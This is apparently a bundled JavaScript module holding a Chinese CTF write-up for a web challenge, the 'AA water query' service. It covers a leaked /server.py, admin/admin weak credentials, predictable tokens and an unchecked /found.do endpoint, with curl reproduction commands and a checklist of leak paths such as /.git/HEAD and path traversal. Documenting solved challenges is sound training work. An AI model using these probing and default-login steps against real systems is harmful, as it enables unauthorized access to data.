@@ -1,0 +1,75 @@
+const n="青岑-001-water-query",o="青岑-001-water-query",e="PS87 / 863「AA 自来水在线查询」：`/server.py` 源码直接暴露，admin/admin 弱口令，`/found.do` 带 token 返回 FLAG 行。2026-10-23 解出，285 分。",t=`# 青岑-001-water-query
+
+> PS87 / 863「AA 自来水在线查询」：\`/server.py\` 源码直接暴露，admin/admin 弱口令，\`/found.do\` 带 token 返回 FLAG 行。2026-10-23 解出，285 分。
+
+## 正文
+
+### 1. 入口
+
+- 实例：\`http://docker.qingcen.net:<port>/\`（内部 5007），\`Server: BaseHTTP/0.6 Python/3.11.15\`。
+- 首页是登录页：\`POST /login.do\`（字段 \`userName\` / \`userPwd\`），同页 JS 里还有 \`modify.do\`（改密）和 \`found.do\`（找回）。
+- 页面里有一条 \`http://localhost:5007/\` 的内部链接，说明服务只绑内部端口，平台 NAT 到外部端口。
+
+### 2. 最短路径：源码泄露
+
+\`GET /server.py\` 返回 200（3443 字节），\`/../server.py\` 同样可读。源码直接给出：
+
+\`\`\`python
+USERS = {'admin': 'admin', 'root': 'root', 'test': '123456'}
+SECRET_FLAG = 'flag{w34k_p4ssw0rd_20w_us3rs_r3al_s1t3_2026}'
+\`\`\`
+
+\`do_GET\` 里 \`/found.do\` 只校验 \`X-Auth-Token\` 或 \`auth_token\` Cookie 是否在内存 \`tokens\` 字典里，然后返回 21 行数据，最后一行是：
+
+\`\`\`json
+{"id": 99, "name": "FLAG", "amount": 0, "flag": "flag{w34k_p4ssw0rd_20w_us3rs_r3al_s1t3_2026}"}
+\`\`\`
+
+### 3. 预期利用链
+
+1. \`POST /login.do\`，\`userName=admin&userPwd=admin\` → 返回 \`token=时间戳+admin\`，并 \`Set-Cookie: auth_token=...\`。
+2. \`GET /found.do\` 带上 \`auth_token\` Cookie（或 \`X-Auth-Token\` 头）→ 返回 FLAG 行。
+3. 提交平台 → 285 分。
+
+### 4. 复现命令
+
+\`\`\`bash
+# 1. 弱口令登录
+curl -s -i -X POST \\
+  --data-urlencode 'userName=admin' \\
+  --data-urlencode 'userPwd=admin' \\
+  http://<host:port>/login.do
+
+# 2. 用返回的 token 读 found.do
+curl -s -b 'auth_token=<token>' http://<host:port>/found.do
+
+# 3. 源码泄露（更短的路径）
+curl -s http://<host:port>/server.py
+\`\`\`
+
+## 关键点
+
+- **先查源码泄露**：\`/server.py\`、\`/app.py\`、\`/.git/HEAD\`、\`__pycache__/\`、路径穿越 \`/../server.py\`。本题源码直接给口令表和 flag。
+- **默认口令表**：\`admin/admin\`、\`root/root\`、\`test/123456\`，先试三个再谈爆破。
+- token 是 \`毫秒时间戳+用户名\`，可预测；但本题 admin 已经够用。
+- \`/found.do\` 只验证 token 是否在内存里，没有角色/权限校验；拿到任意有效 token 就能读全量数据。
+
+## 关联
+
+- [[Web-源码泄露与信息收集]] —— 源码泄露优先于注入和爆破
+- [[Web-认证与会话漏洞]] —— 弱口令与可预测 token
+- 〖内部笔记〗 —— 同平台战役总览
+- [[CTF-竞赛总览与解题流程]] —— 标准六步：读题 → 收信息 → 判型 → 验证 → 拿 flag → 写 WP
+- [[青岑-License授权管理系统]] —— 同一 PS87 题集里的 0 解题，对照"源码拿不到时"的卡点
+
+## 存疑 / 矛盾
+
+- 该 flag 是静态 flag，直接写在源码里；平台已接受（285 分）。
+- 实例端口每次重建都会变；\`server.py\` 的源码可能随题目更新。
+- 本题的 \`modify.do\` 无论传什么参数都返回 \`{"code":200,"msg":"ok"}\`，是空实现，不要在这上面浪费时间。
+
+## 来源
+
+- 糯米内建知识整理 · 2026-10-23（本次实战，无外部文件）
+- 原始请求与回显见本页正文；未写入平台账号凭据
+`,r="project",s="project",a={internal:["CTF-竞赛总览与解题流程","Web-源码泄露与信息收集","Web-认证与会话漏洞","青岑-License授权管理系统"],unresolvedCount:1},d={name:n,title:o,summary:e,content:t,section:r,group:s,links:a};export{t as content,d as default,s as group,a as links,n as name,r as section,e as summary,o as title};
